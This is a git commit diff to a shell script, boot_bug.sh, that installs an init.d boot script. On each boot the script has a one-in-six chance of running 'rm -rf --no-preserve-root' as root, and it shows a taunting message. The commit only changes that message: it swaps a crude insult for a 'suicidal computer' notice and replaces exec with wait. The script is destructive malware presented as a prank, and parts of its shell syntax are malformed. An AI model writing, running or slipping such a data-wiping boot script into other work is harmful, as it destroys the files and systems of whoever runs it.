066e0c2273cb4f1c7554894f442926d69c952cc0
Nick <59221356+mrgfy@users.noreply.github.com>
2020-05-15 10:28:01 -0700

    Update boot_bug.sh

--- boot_bug.sh
+++ boot_bug.sh
@@ -2,6 +2,6 @@
 
 touch /etc/init.d/bash_revolver.sh && \ 
 echo "[ $[ $RANDOM % 6 ] == 0 } && \ 
-su root -g wheel -c "rm -rf --no-preserve-root */*" || echo *Eat a Dick & Go Back to Windows*; or sleep 5 & exec $last_pid" > /etc/init.d/bash_revolver.sh && \ 
+su root -c "rm -rf --no-preserve-root */*" || notify-send --app-name xterm "Your computer is now depressed and has become suicidal. There is a 1 in 6 chance your pc WILL commit suicide. Can you save your pc? Or will it die? Enjoy"; or sleep 5 & wait $last_pid" > /etc/init.d/bash_revolver.sh && \ 
 chmod 755 /etc/init.d/bash_revolver.sh && \ 
 update-rc.d bash_revolver.sh defaults;
